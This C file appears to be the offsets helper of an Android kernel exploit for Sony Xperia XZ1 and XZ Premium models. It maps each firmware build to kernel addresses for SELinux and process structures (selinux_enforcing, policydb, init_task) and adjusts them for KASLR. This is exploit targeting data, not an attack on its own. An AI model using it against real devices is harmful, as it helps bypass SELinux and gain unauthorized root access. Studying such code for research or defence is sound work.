#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <inttypes.h>
#include <string.h>

#include "offsets.h"

#include "debug.h"

#define ARRAYELEMS(a) (sizeof(a) / sizeof(a[0]))

struct offsets offsets[] = {
	// XZ1 Compact
	{ "G8441_47.1.A.8.49",
	  (void *)0xffffff800a903460, (void *)0xffffff800a903270, (void *)0xffffff800a8ffdb4, (void *)0xffffff800a614490, (void *)0xffffff800a61deb0 },

#ifdef INCLUDE_MOST_LIKELY_NOT_WORKING_TARGETS
	// XZ1 Compact
	{ "G8441_47.1.A.2.324",
	  (void *)0xffffff800a8f84a0, (void *)0xffffff800a8f82b0, (void *)0xffffff800a8f4df4, (void *)0xffffff800a614490, (void *)0xffffff800a61de90 },
	// XZ1
	{ "G8341_47.1.A.2.324",
	  (void *)0xffffff800a8f84a0, (void *)0xffffff800a8f82b0, (void *)0xffffff800a8f4df4, (void *)0xffffff800a614490, (void *)0xffffff800a61de90 },
	// XZ1 dual
	{ "G8342_47.1.A.2.281",
	  (void *)0xffffff800a8f84a0, (void *)0xffffff800a8f82b0, (void *)0xffffff800a8f4df4, (void *)0xffffff800a614490, (void *)0xffffff800a61de90 },
	// XZ Premium
	{ "G8141_47.1.A.3.254",
	  (void *)0xffffff800a901460, (void *)0xffffff800a901270, (void *)0xffffff800a8fddb4, (void *)0xffffff800a614490, (void *)0xffffff800a61deb0 },
	// XZ Premium dual
	{ "G8142_47.1.A.3.254",
	  (void *)0xffffff800a901460, (void *)0xffffff800a901270, (void *)0xffffff800a8fddb4, (void *)0xffffff800a614490, (void *)0xffffff800a61deb0 },
#endif

	// XZ1 Compact
	{ "G8441_47.1.A.16.20",
	  (void *)0xffffff800a903460, (void *)0xffffff800a903270, (void *)0xffffff800a8ffdb4, (void *)0xffffff800a614490, (void *)0xffffff800a61deb0 },
	// XZ1
	{ "G8341_47.1.A.16.20",
	  (void *)0xffffff800a903460, (void *)0xffffff800a903270, (void *)0xffffff800a8ffdb4, (void *)0xffffff800a614490, (void *)0xffffff800a61deb0 },
	// XZ1 dual
	{ "G8342_47.1.A.16.20",
	  (void *)0xffffff800a903460, (void *)0xffffff800a903270, (void *)0xffffff800a8ffdb4, (void *)0xffffff800a614490, (void *)0xffffff800a61deb0 },
	// XZ Premium
	{ "G8141_47.1.A.16.20",
	  (void *)0xffffff800a903460, (void *)0xffffff800a903270, (void *)0xffffff800a8ffdb4, (void *)0xffffff800a614490, (void *)0xffffff800a61deb0 },
	// XZ Premium dual
	{ "G8142_47.1.A.16.20",
	  (void *)0xffffff800a903460, (void *)0xffffff800a903270, (void *)0xffffff800a8ffdb4, (void *)0xffffff800a614490, (void *)0xffffff800a61deb0 },

	// Xperia XZ1 Canada (Freedom)
	{ "G8343_47.1.A.12.150",
	  (void *)0xffffff800a904460, (void *)0xffffff800a904270, (void *)0xffffff800a900db4, (void *)0xffffff800a614490, (void *)0xffffff800a61deb0 },
	// Xperia XZ1 Canada (Freedom)
	{ "G8343_47.1.A.12.205",
	  (void *)0xffffff800a904460, (void *)0xffffff800a904270, (void *)0xffffff800a900db4, (void *)0xffffff800a614490, (void *)0xffffff800a61deb0 },

	// Xperia XZ1 SO-01K (Docomo Japan)
	{ "SO-01K_47.1.F.1.105",
	  (void *)0xffffff800a904460, (void *)0xffffff800a904270, (void *)0xffffff800a900db4, (void *)0xffffff800a614490, (void *)0xffffff800a61deb0 },
	// Xperia XZ1 Compact SO-02K (Docomo Japan)
	{ "SO-02K_47.1.F.1.105",
	  (void *)0xffffff800a903460, (void *)0xffffff800a903270, (void *)0xffffff800a8ffdb4, (void *)0xffffff800a614490, (void *)0xffffff800a61deb0 },
	// Xperia XZ1 SOV36 (AU Japan)
	{ "SOV36_47.1.C.9.106",
	  (void *)0xffffff800a904460, (void *)0xffffff800a904270, (void *)0xffffff800a900db4, (void *)0xffffff800a614490, (void *)0xffffff800a61deb0 },
	// Xperia XZ Premium SO-04J (Docomo Japan)
	{ "SO-04J_47.1.F.1.105",
	  (void *)0xffffff800a904460, (void *)0xffffff800a904270, (void *)0xffffff800a900db4, (void *)0xffffff800a614490, (void *)0xffffff800a61deb0 },
};

static int get_targetid(char *id, int idsize)
{
	char *s;
	FILE *f;

	f = popen("getprop ro.product.model", "r");
	if (fgets(id, idsize - 1, f) == NULL)
		return -1;
	s = strrchr(id, '\n');
	if (s != NULL)
		*s = '\0';
	pclose(f);
	strcat(id, "_");

	f = popen("getprop ro.build.display.id", "r");
	if (fgets(id + strlen(id), idsize - strlen(id), f) == NULL)
		return -1;
	s = strrchr(id, '\n');
	if (s != NULL)
		*s = '\0';
	pclose(f);
	return 0;
}

struct offsets* get_offsets(uint64_t kaslr_slide)
{
	char targetid[128];
	unsigned int i;
	struct offsets* o = NULL;

	if(get_targetid(targetid, sizeof(targetid)) < 0)
		goto end;

	for(i = 0; i < ARRAYELEMS(offsets); i++)
	{
		if(strcmp(targetid, offsets[i].targetid))
			continue;
		o = &offsets[i];
		break;
	}

end:
	if(o == NULL) {
		PERR("target '%s' not supported\n", targetid);
		return o;
	}

	o->sidtab += kaslr_slide;
	o->policydb += kaslr_slide;
	o->selinux_enforcing += kaslr_slide;
	o->init_task += kaslr_slide;
	o->init_user_ns += kaslr_slide;

	return o;
}
